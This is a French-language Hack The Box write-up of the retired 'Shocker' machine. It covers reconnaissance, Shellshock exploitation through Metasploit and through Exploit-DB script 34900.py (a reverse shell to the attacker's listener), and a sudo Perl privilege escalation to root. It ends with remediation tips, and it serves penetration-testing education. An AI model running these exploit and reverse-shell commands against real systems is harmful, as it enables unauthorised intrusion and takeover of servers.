---
title: Restez calme et pirater la boîte - Shocker
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-09-03T06:46:14.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-shocker
coverImage: https://www.freecodecamp.org/news/content/images/2020/09/cyberpunk-neon-city-s0-2560x1440-1.jpg
tags:
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: Linux
  slug: linux
- name: penetration testing
  slug: penetration-testing
seo_title: Restez calme et pirater la boîte - Shocker
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en matière de tests d'intrusion.

Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note** : _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.25.05.png)

Shocker démontre la gravité de la célèbre exploitation Shellshock, qui a affecté des millions de serveurs publics.

Nous allons utiliser les outils suivants pour pirater la boîte sur une [boîte Kali Linux](https://www.kali.org/) :

* nmap
* gobuster
* curl
* searchsploit
* metasploit

Commençons.

Tout d'abord, j'ajoute **Shocker** dans le fichier /etc/hosts.

```bash
nano /etc/hosts
```

avec

```bash
10.10.10.56     shocker.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.33.53.png)

## **Étape 1 - Reconnaissance**

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter ensuite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

### **Scan de ports**

Je vais utiliser **Nmap** (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité.

Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feux sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.40.16.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v shocker.htb
```

**-A** : Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v** : Augmente le niveau de verbosité

**shocker**.htb : nom d'hôte pour la boîte Shocker

Si vous trouvez les résultats un peu trop écrasants, vous pouvez essayer ceci :

```bash
nmap shocker.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-20.42.15.png)

Nous pouvons voir qu'il y a 2 ports ouverts dont :

**Port** 80, le plus souvent utilisé par le protocole Hypertext Transfer Protocol (HTTP)

**Port 2222**, messagerie implicite EtherNet/IP pour les données d'E/S

## **Scan de répertoires**

J'utilise **Gobuster**. Gobuster est un scanner de répertoires écrit en Go. Plus d'informations sur l'outil [ici](https://tools.kali.org/web-applications/gobuster).

Gobuster utilise des listes de mots sur Kali qui se trouvent dans le répertoire **/usr/share/wordlists**. J'utilise des listes de mots de **dirb** et **dirbuster**, mais vous pouvez télécharger plus de listes de mots depuis **SecLists** [ici](https://github.com/danielmiessler/SecLists)

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.00.21.png)

J'utilise cette commande pour la liste de mots common.txt de dirb :

```bash
gobuster dir -u shocker.htb -w /usr/share/wordlists/dirb/common.txt
```

Il y a quelques découvertes intéressantes, dont **/cgi-bin/**. Je fais un autre scan de répertoire en me concentrant sur les extensions courantes (cgi, sh, pl et py) :

```bash
gobuster dir -u shocker.htb/cgi-bin -w /usr/share/worldlists/dirb/common.text -x cgi,sh,pl,py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-20.59.28.png)

Et je repère quelque chose d'intéressant avec **/user.sh**.

## **Étape 2 -** Comprendre la vulnérabilité Shellshock

À partir de la phase de reconnaissance, je décide de commencer par le port 80. Et j'obtiens cette page.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.20.19.png)

Pas vraiment utile.

Je fais un curl de la page et je peux voir que le script exécute un peu de bash.

```bash
curl shocker.htb/cgi-bin/user.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.23.39.png)

Je fais quelques recherches autour du nom de la machine et du système d'exploitation Linux, et je tombe sur la vulnérabilité [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)).

> **Shellshock**, également connu sous le nom de **Bashdoor**, est une famille de bugs de sécurité dans le shell [Unix](https://en.wikipedia.org/wiki/Unix)[Bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)), le premier d'entre eux ayant été divulgué le 24 septembre 2014. Shellshock pourrait permettre à un attaquant de faire exécuter des commandes arbitraires par Bash et d'obtenir un accès non autorisé à de nombreux services Internet, tels que les serveurs web, qui utilisent Bash pour traiter les requêtes - Wikipedia

Shellshock repose sur le fait que Bash exécute des commandes de fin lorsqu'il importe une définition de fonction stockée dans une variable d'environnement.

Puisque ces variables d'environnement ne sont pas correctement assainies avant d'être exécutées, un attaquant peut envoyer des commandes à un serveur via des requêtes HTTP et les exécuter via le système d'exploitation du serveur web.

## **Pourquoi cette attaque fonctionne-t-elle ?**

Shellshock se produit lorsqu'un attaquant modifie la requête HTTP d'origine pour contenir la chaîne suivante : `() { :; };`. Bash a des règles spéciales pour gérer une variable commençant par ce motif, et l'interprétera comme une commande qui doit être exécutée.

Vous pouvez en lire plus sur la **Base de données des vulnérabilités nationales**

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.46.12.png)
_[https://nvd.nist.gov/vuln/detail/CVE-2014-6271#vulnCurrentDescriptionTitle](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)_

ou consulter cette présentation **OWASP** sur ce sujet

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.47.35.png)
_[https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)_

**F5** a également écrit un article autour de cette exploitation

![Image](https://www.freecodecamp.org/news/content/images/2020/08/image-150.png)
_https://f5.com/solutions/mitigation/mitigating-the-bash-shellshock-cve-2014-6271-and-cve-2014-7169-vulnerabilities_

## **Étape 3a -** Exploitation de Bashdoor avec Metasploit

Nous allons utiliser **Metasploit**, qui est un framework de test de pénétration qui simplifie le piratage. C'est un outil essentiel pour de nombreux attaquants et défenseurs.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; line-height: inherit; font-family: inherit; font-size: 17.6px; vertical-align: baseline; background-color: transparent; color: var(--gray90); text-decoration: underline; cursor: pointer; word-break: break-word;)_

Je lance le **Metasploit Framework** sur Kali et je cherche la commande que je devrais utiliser pour l'exploitation.

N'oubliez pas de mettre à jour Metasploit lorsque vous le lancez avec cette commande :

```bash
msfupdate
```

Vous pouvez également vérifier si la cible est vulnérable à Shellshock sur Metasploit en utilisant un auxiliaire. Commencez avec cette commande :

```bash
search shellshock
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.04.45.png)

et ensuite

```bash
use 0
```

pour sélectionner

```bash
auxiliary/scanner/http/apache_mod_cgi_bash_env
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.09.06.png)

Vous pouvez vérifier les options avec

```bash
show options
```

définir RHOSTS avec

```bash
set RHOSTS shocker.htb
```

et définir TARGETURI avec

```bash
set TARGETURI /cgi-bin/user.sh
```

Puis exécutez l'auxiliaire avec

```bash
check
```

L'hôte est probablement vulnérable à Shellshock !

Vérifions maintenant l'exploitation avec

```bash
use 5
```

ou la commande

```bash
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Je définis les RHOSTS, le TARGETURI et le LHOST - le mien était 10.10.14.28. Vous devrez le configurer avec votre propre LHOST. Vous pouvez vérifier le vôtre [ici](https://www.hackthebox.eu/home/htb/access).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.17.54.png)

Je vérifie les options pour voir si tout est configuré correctement.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-23.03.45.png)

Je lance ensuite l'exploitation avec

```bash
run
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-23.08.16.png)

J'obtiens une session **Meterpreter**.

Voici la définition de Meterpreter de [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) :

> Meterpreter est une charge utile avancée, dynamiquement extensible qui utilise des injecteurs de DLL _en mémoire_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket de l'injecteur et fournit une API Ruby complète côté client. Il dispose de l'historique des commandes, de la complétion par tabulation, des canaux, et plus encore.

Vous pouvez en lire plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

Commençons par recueillir quelques informations.

**getuid** retourne le vrai identifiant de l'utilisateur du processus appelant.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-23.09.00.png)

## **Étape 3b -** Exploitation de Bashdoor sans **Metasploit**

J'utilise **Searchsploit** pour vérifier s'il existe une exploitation connue. Searchsploit est un outil de recherche en ligne de commande pour [Exploit Database](https://www.exploit-db.com/).

J'utilise la commande suivante :

```bash
searchsploit shellshock
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-21.55.43.png)

J'obtiens plus de détails sur une exploitation avec :

```bash
searchsploit -x 34900.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.33.58.png)

Vous pouvez également consulter la **Exploit Database** pour trouver la même exploitation.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.33.23.png)
_[https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)_

J'obtiens plus d'informations avec :

```bash
searchsploit -p 34900.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.41.16.png)

Je peux voir où il se trouve sur ma boîte Kali. Je copie le fichier dans mon dossier Shocker avec

```bash
cp /usr/share/exploitdb/exploits/linux/remote/34900.py .
```

et pour vérifier s'il a été copié dans ce dossier

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-07.41.39.png)

Je configure ensuite l'exploitation avec

```bash
python 34900.py payload=reverse rhost=shocker.htb lhost=10.10.14.4 lport=1234 pages=/cgi-bin/user.sh
```

Je définis la charge utile sur reverse pour un shell inverse TCP et cela nécessite de configurer le rhost, le lhost et le lport.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-01-at-21.44.01.png)

J'obtiens un shell !

## **Étape 4 -** Recherche du flag user.txt

Je navigue vers le dossier **shelly** depuis **home**.

Je peux lister tous les fichiers/dossiers avec la commande suivante :

```bash
ls -la
```

Je me déplace ensuite vers le dossier **home** avec

```bash
cd home
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.21.00.png)

Et je trouve le flag utilisateur ! Je vérifie le contenu du fichier avec

```bash
cat user.txt
```

## **Étape 5 -** Recherche du flag root.txt

J'essaie de naviguer vers le dossier **root**. L'accès est refusé. Nous devons effectuer une élévation de privilèges.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.22.42.png)

Je tape la commande suivante pour obtenir un shell standard sur le système cible

```bash
shell
```

Je génère un shell TTY avec

```bash
python3 -c "import pty; pty.spawn('/bin/bash/');"
```

Je dois changer pour l'utilisateur root pour accéder à ce dossier. J'utilise la commande

```bash
sudo -l
```

pour comprendre quelle commande je peux exécuter sur localhost.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.26.07.png)

Je découvre que l'utilisateur Shelly peut exécuter la commande Perl en tant que "root" sans mot de passe. Je réalise une élévation de privilèges Perl avec

```bash
sudo perl -e 'exec "/bin/bash";'
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.30.41.png)

Je suis maintenant root ! Je peux naviguer vers le dossier **root**. Je trouve le fichier root.txt et vérifie son contenu avec

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-28-at-22.31.32.png)

Félicitations ! Vous avez trouvé les deux flags.

## **Remédiations**

* Mettre à jour Bash vers une version qui n'interprète pas `() { :; };` de manière spéciale
* Corriger vos serveurs !

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus d'articles de la série **Restez calme et pirater la boîte** [ici](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

![Image](https://www.freecodecamp.org/news/content/images/2020/09/cyberpunk-neon-city-s0-2560x1440.jpg)